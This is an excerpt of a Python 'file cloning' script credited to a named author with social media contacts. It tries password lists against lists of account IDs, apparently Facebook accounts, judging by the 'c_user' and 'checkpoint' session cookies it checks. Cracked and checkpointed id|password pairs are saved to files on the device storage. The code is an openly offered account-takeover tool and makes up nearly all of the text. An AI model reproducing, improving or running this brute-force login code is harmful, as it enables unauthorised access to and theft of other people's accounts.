...
\033[1;37;1m[!]======================================================
\033[1;37;1m[•] Author   : MR-AUH JOIYA
\033[1;37;1m[•] Facebook : AHSAM UL HAQ 
\033[1;37;1m[•] Whatsapp : 03250044021
\033[1;37;1m[•] GitHub   : AHSAM-JOIYA404
\033[1;37;1m[•] TOOL     : FILE CLONING RANDOM 
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AUH-XD] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AU=session.cookies.get_dict().keys()
                        if "c_user" in AU:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [AUH-XD\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/AUH-XD•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AU:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [AUH-XD•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/AUH-XD•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AU:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/AUH-XD•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AU:
                                if 'y' in pcp:
